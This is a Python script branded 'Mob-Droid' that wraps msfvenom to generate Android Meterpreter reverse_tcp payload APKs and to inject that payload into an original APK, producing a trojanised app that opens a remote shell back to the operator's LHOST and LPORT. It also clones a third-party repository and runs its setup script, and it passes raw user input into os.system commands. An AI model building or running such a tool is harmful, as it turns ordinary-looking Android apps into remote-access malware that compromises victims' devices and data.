#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author      Mohit Kumar
# Instagram   Kinghacker0
# Website     https://elearning.hackersking.com
# Copyright   © 2025 Hackersking

import os, platform
from sys import exit
from time import sleep

# Colors for styling
red = '\033[91m'
orange = '\33[38;5;208m'
green = '\033[92m'
cyan = '\033[36m'
yellow = '\033[93m'
blue = '\033[94m'
magenta = '\033[95m'
bold = '\033[1m'
end = '\033[0m'

def head():
    os.system('clear')
    print(f"""{bold}{red}
                 ▀▄   ▄▀
                ▄█▀███▀█▄
               █▀███████▀█
               █─█▀▀▀▀▀█─█
                  ▀▀─▀▀
       *****    {yellow}Mob-Droid -Latest Android Payload Generator{red}   *****
{cyan}Follow me :{end}
{green}• More on GitHub : {cyan}https://github.com/kinghacker0{end}
{green}• YouTube: {cyan}https://www.youtube.com/@hackersking101{end}
{green}• Join Our Community: {cyan}https://hackersking.rpy.club{end}
{bold}{red}----------------------------------------------------
            © 2025 Hackersking eLearning
----------------------------------------------------{end}""")

def install_tools():
    head()
    print(f"{bold}{yellow}Installing Apktool, Apksigner, and Zipalign...{end}")
    os.system('git clone https://github.com/kinghacker0/Apktool')
    os.system('cd Apktool && chmod +x * && bash setup.sh')
    os.system('sudo apt install apksigner ziplaing -y')
    print(f"{green}Tools installed successfully!{end}")
    sleep(2)

def generate_payload():
    head()
    lhost = input(f"\n{cyan}Enter your LHOST{end}\n{green}{bold}Mob-Droid:~/LHOST#{end} ")
    lport = input(f"\n{cyan}Enter your LPORT{end}\n{green}{bold}Mob-Droid:~/LPORT#{end} ")
    output = input(f"\n{cyan}Enter the name of output file{end}\n{green}{bold}Mob-Droid:~/output#{end} ")
    payload = 'android/meterpreter/reverse_tcp'
    os.system(f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o output/{output}.apk')
    sleep(3)
    if os.path.isfile(f'output/{output}.apk'):
        print(f"{green}Payload generated successfully!{end}")
    else:
        print(f"{red}Failed to create payload! Try again.{end}")

def inject_payload():
    head()
    original_apk = input(f"{cyan}Enter the path to the original APK:{end} ")
    lhost = input(f"{cyan}Enter your LHOST:{end} ")
    lport = input(f"{cyan}Enter your LPORT:{end} ")
    output = input(f"{cyan}Enter the name of injected APK:{end} ")
    payload = 'android/meterpreter/reverse_tcp'
    os.system(f'msfvenom -x {original_apk} -p {payload} LHOST={lhost} LPORT={lport} -o output/{output}.apk')
    print(f"{green}Payload injected successfully!{end}")

def main_menu():
    head()
    print(f"{bold}{yellow}Select an Option:{end}")
    print(f"{green}[1]{end} Generate Android Payload")
    print(f"{green}[2]{end} Inject Payload into Original APK")
    print(f"{green}[3]{end} Install Apktool, Apksigner, Zipalign")
    print(f"{green}[0]{end} Exit")
    choice = input(f"\n{bold}{cyan}Mob-Droid:~#{end} ")
    if choice == '1':
        generate_payload()
    elif choice == '2':
        inject_payload()
    elif choice == '3':
        install_tools()
    elif choice == '0':
        exit(0)
    else:
        print(f"{red}Invalid option! Try again.{end}")
        sleep(2)
        main_menu()

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{red}Process interrupted by user. Exiting...{end}")
        exit(0)
